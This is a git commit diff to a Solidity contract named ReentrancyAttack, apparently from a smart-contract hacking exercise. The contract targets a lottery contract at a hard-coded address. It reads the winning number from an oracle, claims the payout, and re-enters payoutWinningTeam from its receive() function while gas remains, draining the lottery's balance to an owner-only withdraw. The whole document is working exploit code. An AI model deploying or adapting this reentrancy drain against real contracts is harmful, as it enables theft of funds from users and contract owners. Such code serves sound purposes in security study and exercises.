334eab254b44bb1972b980c58e6bfaadde543ca4
JP Angelle <jp@angelle.me>
2022-11-10 22:33:43 -0600

    complete 11-9-22

--- projects/ReentrancyAttack/contracts/ReentrancyAttack.sol
+++ projects/ReentrancyAttack/contracts/ReentrancyAttack.sol
@@ -1,5 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.10;
+pragma solidity 0.8.10;
+
+import "@openzeppelin/contracts/access/Ownable.sol";
 
 interface ILottery {
     function payoutWinningTeam(address _team) external returns (bool);
@@ -7,35 +9,30 @@ interface ILottery {
     function registerTeam(address _walletAddress, string calldata _teamName, string calldata _password) external payable;
 }
 
-contract ReentrancyAttack {
-    event Log(string);
+interface IOracle {
+    function getRandomNumber() external view returns (uint256);
+}
 
+contract ReentrancyAttack is Ownable {
     address lotteryAddress = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
+    address oracleAddress = 0x0d186F6b68a95B3f575177b75c4144A941bFC4f3;
 
     constructor() payable {
-        ILottery(lotteryAddress).registerTeam{value: msg.value}(address(this), 'hacker team', "password");
-        attack();
+        ILottery(lotteryAddress).registerTeam{value: msg.value}(address(this), "hack boi", "password");
+    }
+
+    function drain() external {
+        ILottery(lotteryAddress).makeAGuess(address(this), IOracle(oracleAddress).getRandomNumber());
+        ILottery(lotteryAddress).payoutWinningTeam(address(this));
     }
 
     receive() external payable {
-        emit Log("receive called");
-        if (address(ILottery(lotteryAddress)).balance >= 0.000000002 ether) {
-            ILottery(lotteryAddress).makeAGuess(address(this), 0);
+        if (gasleft() > 50_000) {
             ILottery(lotteryAddress).payoutWinningTeam(address(this));
         }
     }
 
-    function attack() public {
-        ILottery(lotteryAddress).makeAGuess(address(this), 0);
-        ILottery(lotteryAddress).makeAGuess(address(this), 0);
-        ILottery(lotteryAddress).makeAGuess(address(this), 0);
-        ILottery(lotteryAddress).makeAGuess(address(this), 0);
-        ILottery(lotteryAddress).makeAGuess(address(this), 0);
-        ILottery(lotteryAddress).makeAGuess(address(this), 0);
-        ILottery(lotteryAddress).payoutWinningTeam(address(this));
-    }
-
-    function withdraw(address payable receiver) public {
-        receiver.transfer(address(this).balance);
+    function withdraw() public onlyOwner {
+        payable(msg.sender).transfer(address(this).balance);
     }
 }
